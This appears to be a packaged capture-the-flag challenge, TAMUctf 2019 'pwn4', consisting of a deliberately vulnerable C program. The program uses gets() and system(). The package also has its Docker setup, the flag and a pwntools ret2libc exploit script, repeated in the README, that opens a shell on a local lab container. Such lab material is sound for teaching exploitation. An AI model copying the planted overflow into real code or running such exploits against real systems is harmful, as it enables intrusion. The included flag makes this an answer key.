{
    "Dockerfile": "FROM 32bit/ubuntu:16.04\n\nRUN apt update\nRUN apt install -y socat\n\nRUN groupadd ctf\n\nRUN mkdir /pwn\n\nCOPY entry.sh /entry.sh\nCOPY pwn4 /pwn/pwn4\nCOPY flag.txt /pwn/flag.txt\n\nRUN useradd -G ctf --home=/pwn pwnuser\nRUN useradd -G ctf --home=/pwn pwnflag\n\nRUN chown pwnflag:pwnflag /pwn/flag.txt\nRUN chown pwnflag:pwnflag /pwn/pwn4\n\nRUN chmod 4755 /pwn/pwn4\nRUN chmod 444 /pwn/flag.txt\n\nEXPOSE 4324\nCMD [\"./entry.sh\"]\n",
    "entry.sh": "#!/bin/bash\nwhile :\ndo\n    su -c \"socat TCP4-listen:4324,reuseaddr,fork EXEC:/pwn/pwn4\" - pwnuser\ndone\n",
    "flag.txt": "gigem{5y573m_0v3rfl0w}\n",
    "Makefile": "all: pwn\n\npwn: simple_ret2libc.c\n\tgcc -fno-stack-protector -no-pie simple_ret2libc.c -m32  -o pwn4\n",
    "pwn4": "[Binary file or unsupported type: c:\\users\\jomue\\tamuctf-2019-master\\tamuctf-2019-master\\pwn\\pwn4\\pwn4]",
    "pwn_ret2libc.py": "from pwn import *\n\n\n#p = process('./pwn4')\np = remote('172.17.0.2', 4324)\n\nsystem = 0x80483f0 \nbinsh = 0x804a034\n\npayload = '/'*37\npayload += p32(system)\npayload += p32(0xdeadbeef) \npayload += p32(binsh)\n\nf = open('out', 'wb')\nf.write(payload +'\\n')\nf.close()\n\np.send(payload + '\\n')\np.interactive()\n",
    "README.md": "# Simple Return to Libc\n\n## Challenge\n`nc pwn.tamuctf.com 4324`\n\n## Setup\n\nBuild the docker container `docker build -t pwn4 .` and run it `docker run pwn4`\n\n## Solution\nFind the address of `system()` and `/bin/sh`. Both are static since PIE is not enabled. Payload must have a `/` in it in order to work correctly.  \nBelow is an example solution script:  \n```python\nfrom pwn import *\n\n\n#p = process('./pwn4')\np = remote('172.17.0.2', 4324)\n\nsystem = 0x80483f0\nbinsh = 0x804a034\n\npayload = '/'*37\npayload += p32(system)\npayload += p32(0xdeadbeef)\npayload += p32(binsh)\n\nf = open('out', 'wb')\nf.write(payload +'\\n')\nf.close()\n\np.send(payload + '\\n')\np.interactive()\n```\n",
    "simple_ret2libc.c": "#include \"unistd.h\"\n#include \"stdio.h\"\n#include \"stdlib.h\"\n\nchar secret[] = \"/bin/sh\";\n\nvoid run_cmd(char* user_in) {\n    char user_cmd[30];\n    snprintf(user_cmd, 27, \"ls %s\", user_in);\n    printf(\"Result of %s:\\n\", user_cmd);\n    system(user_cmd);\n}\n\nvoid laas() {\n    printf(\"ls as a service (laas)(Copyright pending)\\n\");\n    printf(\"Enter the arguments you would like to pass to ls:\\n\");\n    char user_in[25];\n    gets(user_in);\n    if(strchr(user_in, '/') == NULL)\n        run_cmd(user_in);\n    else\n        printf(\"No slashes allowed\\n\");\n}\n\nint main() {\n    setvbuf(stdout,_IONBF,0,0);\n    while(1)\n        laas();\n}\n",
    "category": "Pwn"
}